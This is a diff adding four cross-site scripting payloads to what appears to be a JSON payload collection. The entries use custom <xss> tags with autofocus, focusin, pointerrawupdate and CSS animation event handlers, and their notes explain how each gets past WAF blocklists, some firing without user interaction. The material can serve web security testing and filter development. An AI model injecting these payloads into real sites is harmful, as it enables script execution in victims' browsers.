@@ -13661,6 +13661,50 @@
       ],
       "confidence": "medium",
       "note": "unclosed-quote attribute swallow breakout (range2 unclosed-quote)"
+    },
+    {
+      "id": "html5_new_0970",
+      "context": "html5_new",
+      "tags": [
+        "modern_waf",
+        "auto_fire"
+      ],
+      "confidence": "high",
+      "payload": "<xss autofocus onfocus=alert(1) tabindex=1></xss>",
+      "note": "Sandbox: live, NO activation needed (autofocus focuses on load in Chromium). Defeats filters that drop <input>/<form> tags or the input-autofocus shape specifically."
+    },
+    {
+      "id": "html5_new_0971",
+      "context": "html5_new",
+      "tags": [
+        "modern_waf",
+        "activation"
+      ],
+      "confidence": "high",
+      "payload": "<xss onfocusin=alert(1) autofocus tabindex=1></xss>",
+      "note": "Sandbox: live (activation-gated). focusin bubbles and is absent from most keyword blocklists that cover onfocus/onfocusin variants of form tags only."
+    },
+    {
+      "id": "html5_new_0972",
+      "context": "html5_new",
+      "tags": [
+        "modern_waf",
+        "activation"
+      ],
+      "confidence": "high",
+      "payload": "<xss onpointerrawupdate=alert(1) style=\"position:fixed;top:0;left:0;width:100vw;height:100vh\"></xss>",
+      "note": "Sandbox: live (activation-gated; any pointer motion over the full-viewport overlay fires). onpointerrawupdate (2022+) is missing from common WAF handler denylists."
+    },
+    {
+      "id": "html5_new_0973",
+      "context": "html5_new",
+      "tags": [
+        "modern_waf",
+        "auto_fire"
+      ],
+      "confidence": "medium",
+      "payload": "<style>@keyframes xsskf{}</style><xss style=\"animation-name:xsskf;animation-duration:1s\" onanimationstart=alert(1)></xss>",
+      "note": "Fires when the CSS animation starts; needs no user interaction. Sandbox verdict: unknown (cannot model a running animation) -- browser-verified family, hence medium confidence."
     }
   ],
   "polyglots": [
